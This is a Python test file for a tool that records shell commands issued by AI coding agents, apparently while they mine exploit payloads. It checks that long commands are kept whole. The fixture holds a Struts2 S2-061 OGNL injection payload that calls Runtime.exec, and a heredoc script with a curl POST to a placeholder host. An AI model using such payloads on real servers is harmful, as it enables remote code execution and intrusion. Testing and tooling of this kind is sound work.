"""A recorded command must be replayable, not a preview.

The payload-mining effort hit a wall that took three rounds to see: of 22,819
recorded commands the longest was **332 chars** and 8,790 were **exactly 300**.
The cause was one slice in the Codex parser (``text=str(...)[:300]``) whose
output was the *only* copy persisted, so every multi-line exploit — OGNL
expressions, gremlin statements, heredoc'd scripts — reached the event stream
pre-truncated. Nothing downstream could recover what was cut there.

These tests pin the split that fixes it: ``text`` is the deck preview,
``command`` is the record.  They also pin the collector actually preferring
``command``; a parser that keeps the full text is useless if the recorder still
reads the preview.
"""

from __future__ import annotations

import json

import pytest

from muteki.solver.cli_driver import ClaudeCodeDriver, CodexDriver, StreamStep


#: A realistic long payload: Struts2 S2-061's OGNL trampoline, 700+ chars, which
#: the old parser cut at 300 mid-expression.
LONG_OGNL = (
    "%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"])."
    "(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"])."
    "(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\"))."
    "(#bean.setBean(#stack)).(#context=#bean.get(\"context\"))."
    "(#mbean=#instancemanager.newInstance(\"org.apache.tomcat.InstanceManager\"))."
    "(#bean.setBean(#mbean)).(#cl=#bean.get(\"classLoader\"))."
    "(# Ur=#instancemanager.newInstance(\"java.net.URL\"))."
    "(#ct=#instancemanager.newInstance(\"java.lang.ClassLoader\"))."
    "(#cl.loadClass(\"java.lang.Runtime\").getMethod(\"exec\",#ct).invoke(null,\"id\"))}"
)


def _codex_line(command: str) -> str:
    return json.dumps(
        {"type": "item.started", "item": {"type": "command_execution", "command": command}}
    )


def test_codex_parser_keeps_the_whole_command():
    step = CodexDriver().parse_stream_line(_codex_line(LONG_OGNL))

    assert step is not None
    assert step.kind == "tool"
    # The record is complete...
    assert step.command == LONG_OGNL
    # ...while the preview stays small, so the live deck is not flooded.
    assert len(step.text) == 300


def test_codex_parser_survives_a_multiline_heredoc():
    script = "cat > /tmp/x.sh <<'EOF'\n#!/bin/bash\ncurl -s http://x/ -d 'a=1'\nEOF\nbash /tmp/x.sh"
    step = CodexDriver().parse_stream_line(_codex_line(script))

    assert step is not None
    assert step.command == script
    assert "EOF" in step.command


def test_claude_parser_keeps_the_whole_command():
    event = {
        "type": "assistant",
        "message": {
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": LONG_OGNL}}
            ]
        },
    }
    step = ClaudeCodeDriver().parse_stream_line(json.dumps(event))

    assert step is not None and step.kind == "tool"
    assert step.command == LONG_OGNL
    assert len(step.text) == 300


def test_recorder_prefers_the_full_command_over_the_preview():
    """A complete parser is worthless if the collector still reads ``text``."""

    from app.solver.muteki.worker import official_worker as ow

    captured: list[dict] = []

    class FakeJob:
        worker_id = "w1"

    worker = object.__new__(ow.OfficialWorkerAdapter)
    worker._pending_commands = {}
    worker._capture_tool_markers = lambda job, output: None
    worker._emit_step_payload = lambda payload: captured.append(payload)

    step = StreamStep("tool", tool="shell", text=LONG_OGNL[:300], command=LONG_OGNL)
    worker._on_step(FakeJob(), step)

    assert captured, "no event emitted"
    assert captured[0]["command"] == LONG_OGNL


def test_recorder_still_falls_back_to_text_when_command_is_absent():
    """Adapters that set only ``text`` must keep working."""

    from app.solver.muteki.worker import official_worker as ow

    captured: list[dict] = []
    worker = object.__new__(ow.OfficialWorkerAdapter)
    worker._pending_commands = {}
    worker._capture_tool_markers = lambda job, output: None
    worker._emit_step_payload = lambda payload: captured.append(payload)

    class FakeJob:
        worker_id = "w1"

    worker._on_step(FakeJob(), StreamStep("tool", tool="shell", text="id"))
    assert captured[0]["command"] == "id"


def test_command_limit_can_hold_a_real_payload():
    """900 was measured to be too small for the payloads worth recording."""

    from app.solver.muteki.redaction import COMMAND_LIMIT, redact

    assert COMMAND_LIMIT >= len(LONG_OGNL)
    assert redact(LONG_OGNL, limit=COMMAND_LIMIT) == LONG_OGNL


def test_redaction_still_bounds_a_runaway_command():
    from app.solver.muteki.redaction import COMMAND_LIMIT, redact

    out = redact("A" * (COMMAND_LIMIT + 500), limit=COMMAND_LIMIT)
    assert "…[+" in out
    assert len(out) < COMMAND_LIMIT + 40
